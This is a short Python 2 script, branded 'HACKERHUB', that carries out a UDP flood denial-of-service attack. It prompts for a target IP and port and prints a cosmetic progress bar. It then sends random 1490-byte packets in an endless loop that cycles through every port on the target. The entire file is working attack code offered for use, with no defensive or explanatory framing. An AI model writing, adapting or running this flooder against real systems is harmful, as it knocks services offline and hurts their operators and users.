import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

##############
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)
#############

os.system("clear")
os.system("figlet -p HACKERHUB")
print
print "Author   : MRX"
print "You Tube : https://www.youngh4k4.wordpres.com"
print "github   : https://github.com/younghack3r"
print "Facebook :   !!!! Dont mess with me !!!!"
print
ip = raw_input("IP Target : ")
port = input("Port       : ")

os.system("clear")
os.system("figlet -p Attack Starting")
print "[                    ] 0% "
time.sleep(5)
print "[===== >              ] 25%"
time.sleep(5)
print "[==========>          ] 50%"
time.sleep(5)
print "[===============>     ] 75%"
time.sleep(5)
print "[====================>] 100%"
time.sleep(3)
sent = 0
while True:
     sock.sendto(bytes, (ip,port))
     sent = sent + 1
     port = port + 1
     print "Sent %s packet to %s tagert ip:%s"%(sent,ip,port)
     if port == 65534:
       port = 1

